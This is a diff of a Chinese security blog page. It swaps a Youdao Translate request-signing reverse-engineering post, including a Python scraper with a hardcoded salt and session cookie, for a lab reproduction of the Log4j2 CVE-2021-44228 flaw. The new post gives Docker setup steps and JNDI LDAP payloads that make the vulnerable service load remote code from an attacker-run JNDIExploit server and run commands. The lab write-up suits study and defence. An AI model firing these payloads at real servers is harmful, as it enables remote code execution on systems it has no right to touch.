@@ -21,29 +21,35 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="js源码 12345678910111213141516define(&quot;newweb&#x2F;common&#x2F;service&quot;, [&quot;.&#x2F;utils&quot;, &quot;.&#x2F;md5&quot;, &quot;.&#x2F;jquery-1.7&quot;], function(e, t) &amp;#123;    var n &#x3D; e(&quot;.&#x2F;jquery-1.7&quot;);">
+    <meta name="description" content="概述CVE-2021-44228Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="有道翻译逆向">
-<meta property="og:url" content="https://syst1m.top/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/index.html">
+<meta property="og:title" content="log4j2漏洞复现">
+<meta property="og:url" content="https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="Syst1m">
-<meta property="og:description" content="js源码 12345678910111213141516define(&quot;newweb&#x2F;common&#x2F;service&quot;, [&quot;.&#x2F;utils&quot;, &quot;.&#x2F;md5&quot;, &quot;.&#x2F;jquery-1.7&quot;], function(e, t) &amp;#123;    var n &#x3D; e(&quot;.&#x2F;jquery-1.7&quot;);">
+<meta property="og:description" content="概述CVE-2021-44228Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-05-07T10:25:23.000Z">
-<meta property="article:modified_time" content="2022-05-07T10:32:17.670Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206121717449.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206122026561.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206122026083.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206122035772.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206122055177.png">
+<meta property="article:published_time" content="2022-06-12T09:09:11.000Z">
+<meta property="article:modified_time" content="2022-06-12T12:55:58.805Z">
 <meta property="article:author" content="Syst1m">
-<meta property="article:tag" content="爬虫">
-<meta property="article:tag" content="逆向">
+<meta property="article:tag" content="blog,爬虫,web安全">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png">
 
 
-<link rel="canonical" href="https://syst1m.top/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/">
+<link rel="canonical" href="https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/","path":"2022/05/07/有道翻译逆向/","title":"有道翻译逆向"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","path":"2022/06/12/log4j2漏洞复现/","title":"log4j2漏洞复现"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>有道翻译逆向 | Syst1m</title>
+<title>log4j2漏洞复现 | Syst1m</title>
   
 
 
@@ -133,7 +139,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -146,6 +152,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-number">2.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">3.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE"><span class="nav-number">4.1.</span> <span class="nav-text">访问</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%B4%E6%97%B6%E5%9F%9F%E5%90%8D"><span class="nav-number">4.2.</span> <span class="nav-text">获取临时域名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dnslog%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="nav-number">4.3.</span> <span class="nav-text">dnslog执行代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">4.4.</span> <span class="nav-text">命令执行</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -237,7 +244,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/IMG_0010.JPG">
@@ -250,12 +257,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="有道翻译逆向 | Syst1m">
+      <meta itemprop="name" content="log4j2漏洞复现 | Syst1m">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          有道翻译逆向
+          log4j2漏洞复现
         </h1>
 
         <div class="post-meta-container">
@@ -267,16 +274,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-05-07 18:25:23 / 修改时间：18:32:17" itemprop="dateCreated datePublished" datetime="2022-05-07T18:25:23+08:00">2022-05-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/js%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">js逆向</span></a>
-        </span>
+      <time title="创建时间：2022-06-12 17:09:11 / 修改时间：20:55:58" itemprop="dateCreated datePublished" datetime="2022-06-12T17:09:11+08:00">2022-06-12</time>
     </span>
 
   
@@ -296,11 +294,23 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>js源码</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="string">&quot;newweb/common/service&quot;</span>, [<span class="string">&quot;./utils&quot;</span>, <span class="string">&quot;./md5&quot;</span>, <span class="string">&quot;./jquery-1.7&quot;</span>], <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="title function_">e</span>(<span class="string">&quot;./jquery-1.7&quot;</span>);</span><br><span class="line">    <span class="title function_">e</span>(<span class="string">&quot;./utils&quot;</span>);</span><br><span class="line">    <span class="title function_">e</span>(<span class="string">&quot;./md5&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> r = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> t = n.<span class="title function_">md5</span>(navigator.<span class="property">appVersion</span>)</span><br><span class="line">            , r = <span class="string">&quot;&quot;</span> + (<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>()</span><br><span class="line">            , i = r + <span class="built_in">parseInt</span>(<span class="number">10</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>(), <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">ts</span>: r,</span><br><span class="line">            <span class="attr">bv</span>: t,</span><br><span class="line">            <span class="attr">salt</span>: i,</span><br><span class="line">            <span class="attr">sign</span>: n.<span class="title function_">md5</span>(<span class="string">&quot;fanyideskweb&quot;</span> + e + i + <span class="string">&quot;Ygy_4c=r#e#4EX^NUGUc5&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// e = 翻译的字符串, i = 字符串形式的js时间戳+一位整数</span></span><br></pre></td></tr></table></figure>
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CVE-2021-44228<br>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。如：Apache Struts2、Apache Solr、Apache Druid、Apache Flink等。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>用的是github上的一个docker环境:log4j_vuln</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.1 拉取漏洞环境镜像</span><br><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">1.2 运行漏洞环境容器</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">1.3 进入容器中</span><br><span class="line">docker <span class="built_in">exec</span> -it log4j_vuln_container /bin/bash</span><br><span class="line">1.4 启动漏洞环境</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br><span class="line">打开http://xxx.xxx.xxx.xxx:8080/webstudy/hello-fengxuan</span><br><span class="line">出现以下页面，说明搭建成功。</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>访问url<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122023707.png"></p>
+<h2 id="获取临时域名"><a href="#获取临时域名" class="headerlink" title="获取临时域名"></a>获取临时域名</h2><p>访问 <a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206121717449.png"></p>
+<h2 id="dnslog执行代码"><a href="#dnslog执行代码" class="headerlink" title="dnslog执行代码"></a>dnslog执行代码</h2><p>构造payload</p>
+<figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$&#123;<span class="attribute">jndi</span>:ldap://log4j2<span class="variable">.xxxxxx</span><span class="variable">.dnslog</span><span class="variable">.cn</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122026561.png"></p>
+<p>查看dns平台已经执行成功<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122026083.png"></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在本地先要生成JNDI链接并启动后端相关服务，注意防火墙开启相关端口，用的是<a target="_blank" rel="noopener" href="https://download.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit-1.2-SNAPSHOT.jar</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.20.146.195 -l 9999 -p 80</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122035772.png"></p>
+<p>构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd: <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">c=<span class="variable">$&#123;jndi:ldap://10.20.146.195:9999/TomcatBypass/TomcatEcho&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206122055177.png"></p>
 
-<p>python实现代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fanyi</span>(<span class="params">word</span>):</span><br><span class="line">    <span class="comment"># 13位时间戳</span></span><br><span class="line">    lts = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">    <span class="comment"># 时间戳+一个随机整数</span></span><br><span class="line">    salt = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">10000</span>))</span><br><span class="line">    <span class="comment"># 写死的两个参数+翻译的字符+salt</span></span><br><span class="line">    sign = <span class="string">&quot;fanyideskweb&quot;</span> + word + salt + <span class="string">&quot;Y2FYu%TNSbMCxc3t2u^XT&quot;</span></span><br><span class="line">    <span class="comment"># md5 加密字符</span></span><br><span class="line">    sign = hashlib.md5(sign.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">    data = &#123;<span class="string">&quot;i&quot;</span>: word,</span><br><span class="line">            <span class="string">&quot;from&quot;</span>: <span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">            <span class="string">&quot;to&quot;</span>: <span class="string">&quot;AUTO&quot;</span>,</span><br><span class="line">            <span class="string">&quot;smartresult&quot;</span>: <span class="string">&quot;dict&quot;</span>,</span><br><span class="line">            <span class="string">&quot;client&quot;</span>: <span class="string">&quot;fanyideskweb&quot;</span>,</span><br><span class="line">            <span class="comment"># 时间戳14位</span></span><br><span class="line">            <span class="string">&quot;salt&quot;</span>: salt,</span><br><span class="line">            <span class="comment"># 加密的数据</span></span><br><span class="line">            <span class="string">&quot;sign&quot;</span>: sign,</span><br><span class="line">            <span class="comment"># 时间戳13位</span></span><br><span class="line">            <span class="string">&quot;lts&quot;</span>: lts,</span><br><span class="line">            <span class="string">&quot;bv&quot;</span>: <span class="string">&#x27;d771cbe0c376715add7059261c9e06bd&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;doctype&quot;</span>: <span class="string">&quot;json&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;2.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;keyfrom&quot;</span>: <span class="string">&quot;fanyi.web&quot;</span>,</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;FY_BY_REALTlME&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">    url = <span class="string">&#x27;https://fanyi.youdao.com/translate_o?smartresult=dict&amp;smartresult=rule&#x27;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://fanyi.youdao.com/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;OUTFOX_SEARCH_USER_ID=-1711366876@10.108.160.105; OUTFOX_SEARCH_USER_ID_NCOO=528854206.9578509; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;fanyi-ad-closed=0; JSESSIONID=aaab35aMiB_2j8wyyH0-x; fanyi-ad-id=305426; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;___rl__test__cookies=1649078361368 &#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.post(url=url, headers=header, data=data)</span><br><span class="line">    <span class="built_in">print</span>(resp.json()[<span class="string">&#x27;translateResult&#x27;</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="string">&#x27;tgt&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_fanyi(<span class="string">&#x27;dog&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -337,7 +347,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://syst1m.top/2022/05/07/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E9%80%86%E5%90%91/" title="有道翻译逆向">https://syst1m.top/2022/05/07/有道翻译逆向/</a>
+      <a href="https://syst1m.top/2022/06/12/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="log4j2漏洞复现">https://syst1m.top/2022/06/12/log4j2漏洞复现/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -345,23 +355,16 @@
 </ul>
 </div>
 
-          <div class="post-tags">
-              <a href="/tags/%E7%88%AC%E8%99%AB/" rel="tag"># 爬虫</a>
-              <a href="/tags/%E9%80%86%E5%90%91/" rel="tag"># 逆向</a>
-          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2022/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="prev" title="中间件解析漏洞总结">
-                  <i class="fa fa-chevron-left"></i> 中间件解析漏洞总结
+                <a href="/2022/06/11/Struts2S2-061%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="Struts2 S2-061漏洞复现">
+                  <i class="fa fa-chevron-left"></i> Struts2 S2-061漏洞复现
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2022/05/11/%E5%88%A9%E7%94%A8%E7%88%AC%E8%99%AB%E5%AE%9A%E6%97%B6%E7%BB%99%E5%A5%B3%E5%8F%8B%E5%8F%91%E9%80%81%E6%9A%96%E5%BF%83%E9%82%AE%E4%BB%B6/" rel="next" title="利用爬虫定时给女友发送暖心邮件">
-                  利用爬虫定时给女友发送暖心邮件 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
